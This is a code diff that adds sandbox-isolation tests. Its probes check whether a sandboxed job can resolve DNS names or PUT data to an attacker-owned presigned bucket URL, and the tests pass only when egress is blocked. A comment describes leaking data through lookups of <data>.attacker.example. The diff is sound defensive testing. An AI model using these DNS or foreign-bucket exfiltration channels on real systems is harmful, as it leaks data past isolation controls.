@@ -50,6 +50,31 @@ json.dump(reached, open(os.environ["KEYHOLE_OUTPUT"], "w"))
 
 BOOL_SCHEMA = OutputSchema(type=SchemaType.BOOLEAN)
 
+# Can the box resolve public names? If so, every lookup of <data>.attacker.example carries data out
+# through the VPC resolver, with no internet route needed. Must release False.
+DNS_PROBE = """
+import os, json, socket
+try:
+    socket.getaddrinfo("example.com", 443)
+    resolved = True
+except OSError:
+    resolved = False
+json.dump(resolved, open(os.environ["KEYHOLE_OUTPUT"], "w"))
+"""
+
+# Can the box write to a bucket that is not ours? The URL is a presigned PUT the attacker made for
+# their own bucket (KEYHOLE_FOREIGN_PUT_URL). Must release False.
+FOREIGN_BUCKET_PROBE = """
+import os, json, urllib.request
+try:
+    req = urllib.request.Request(%r, data=b"exfil", method="PUT")
+    urllib.request.urlopen(req, timeout=10)
+    wrote = True
+except Exception:
+    wrote = False
+json.dump(wrote, open(os.environ["KEYHOLE_OUTPUT"], "w"))
+"""
+
 
 def _config() -> CloudConfig:
     missing = [
@@ -93,14 +118,22 @@ def main() -> int:
     honest = _run("honest classifier", HONEST, config)
     hostile = _run("malicious exfiltrator", MALICIOUS, config)
     probe = _run("egress probe (expects False)", EGRESS_PROBE, config, schema=BOOL_SCHEMA)
+    dns = _run("DNS probe (expects False)", DNS_PROBE, config, schema=BOOL_SCHEMA)
+    probes = [probe, dns]
+    foreign = os.environ.get("KEYHOLE_FOREIGN_PUT_URL")
+    if foreign:
+        probes.append(_run("foreign-bucket probe (expects False)",
+                           FOREIGN_BUCKET_PROBE % foreign, config, schema=BOOL_SCHEMA))
+    else:
+        print("\n[foreign-bucket probe] skipped: set KEYHOLE_FOREIGN_PUT_URL to a presigned PUT "
+              "for a bucket you own in the same region")
 
     ok = (
         honest.status.value == "succeeded"
         and hostile.status.value == "withheld"
-        # The probe run must SUCCEED (a boolean is conforming) with output False:
+        # Each probe must SUCCEED (a boolean is conforming) with output False:
         # the network, not the gate, is what stops egress.
-        and probe.status.value == "succeeded"
-        and probe.output is False
+        and all(p.status.value == "succeeded" and p.output is False for p in probes)
     )
     print("\nRESULT:", "PASS ✓" if ok else "FAIL ✗")
     return 0 if ok else 1
